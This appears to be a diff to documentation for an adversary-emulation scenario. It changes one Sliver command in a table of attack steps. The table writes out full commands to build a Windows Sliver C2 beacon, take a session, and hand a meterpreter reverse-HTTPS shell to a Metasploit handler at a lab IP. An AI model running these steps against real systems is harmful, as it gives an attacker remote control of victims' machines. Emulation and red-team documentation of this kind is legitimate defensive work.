@@ -91,7 +91,7 @@ Each `uuid` encompasses an `executor`, within which the `command` parameter spec
 
 | Steps        | Description	                  | Executor                 |
 |:-------------|:-------------------------------|:-------------------------|
-| Implant Generation | Sliver generates implant for Windows platform and enables mtls monitoring. | # sliver<br>> generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save<br>> mtls |
+| Implant Generation | Sliver generates implant for Windows platform and enables mtls monitoring. | # sliver<br>> generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save .<br>> mtls |
 | Execution | Download&Execute the sliver implant.   | # sliver<br>> sessions -i session_id |
 | Directory Disclosure | The pwd command in a Sliver session prints the current working directory of the active session. | # sliver<br>> pwd   |
 | Build meterpreter session  |Use sliver and msf linkage, msf starts monitoring, sliver bounces a shell back,so that msf establishes a shell connection with the target host. | # msfconsole<br>> use exploit/multi/handler<br>> set payload windows/x64/meterpreter_reverse_https<br>> set lport 9091<br>> set lhost 192.168.130.128<br>> exploit -j -z<br> # sliver<br>> msf --lhost 192.168.130.128 -l 9091<br># msfconsole<br>> sessions 1 |
